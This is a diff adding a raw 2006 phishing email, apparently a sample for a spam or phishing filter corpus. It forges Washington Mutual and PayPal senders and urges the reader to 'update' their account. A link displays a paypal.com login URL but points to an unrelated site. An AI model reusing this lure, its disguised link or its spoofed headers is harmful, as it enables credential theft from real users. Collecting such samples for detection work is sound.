@@ -1,0 +1,66 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 920D046A8C
+ for <user@login.example.com>; Wed, 27 Sep 2006 18:22:50 -0400 (EDT)
+Received: from 192.168.1.2
+ (host145-97-static.32-85-b.business.telecomitalia.it [85.32.97.145])
+ by mail.example.org (Postfix) with SMTP id 15A646FA63A
+ for <user@example.com>; Wed, 27 Sep 2006 18:22:49 -0400 (EDT)
+Received: from 152.97.198.0 by ; Wed, 27 Sep 2006 17:16:05 -0600
+Message-ID: <OFCMTGBRIACZFPEDWGHDZ@verizon.net>
+From: "Washington Mutual Security Service" <confirm@wamu.com>
+Reply-To: "Washington Mutual Security Service" <service@paypal.com>
+To: user@example.com
+Subject: WARNING: CONFIRM YOUR ONLINE BANKING ACCOUNT
+Date: Thu, 28 Sep 2006 00:22:05 +0100
+X-Mailer: Microsoft Outlook Express 5.00.2615.200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--0149532461169378839"
+X-Priority: 1
+X-MSMail-Priority: High
+Content-Length: 1580
+Lines: 35
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 334
+
+----0149532461169378839
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<title>PayPal Security Service </title>
+</head>
+ 
+<body>
+ 
+<p>
+<img border=3D"0" src=3D"http://www.paypalobjects.com/en_US/i/header/t1Hdr=
+_idOverview_589x156.jpg" width=3D"600" height=3D"168"></p>
+<FONT face=3D"Courier New" size=3D2>Dear valued PayPal member :<BR><BR>Ide=
+ntity protection matters and PayPal works day and night to help keep<BR>yo=
+ur identity
+safe.<BR><BR>That's why it was come to our attention that your PayPal acco=
+unt information<BR>needs to be updated as part of our continuing commitmen=
+t to protect your <BR>account and to reduce the instance of fraud on our w=
+ebsite.If u could take 5-<BR><BR>10 minutes out of your online experience =
+and update your personal records<BR>you will not run into any future probl=
+ems with the online service.However , <BR>failure to update your records, =
+your PayPal session will not be interrupted<BR><BR>and will continued as n=
+ormal.<BR><BR>To login to your paypal account and update your records clic=
+k on the<BR>following link:<BR><BR><A class=3Dm1
+href=3D"http://www.northcoastrock.org/cpm/albums/userpics/10003/index.htm"=
+ target=3D_blank><FONT
+face=3D"Courier New" color=3D#0066cc size=3D2>https://www.paypal.com/us/cg=
+i-bin/webscr?
+cmd=3D_login-run</FONT></A><BR><BR>Thank you for using PayPal<BR><BR>
+<FONT color=3D#006699 size=3D2>Privacy Notice</FONT></A><FONT 
+color=3D#006699 size=3D2> </FONT><FONT size=3D2>=A92006, PayPal, Inc. or i=
+ts 
+affiliates. </FONT></SPAN></FONT></P>
+
+----0149532461169378839--
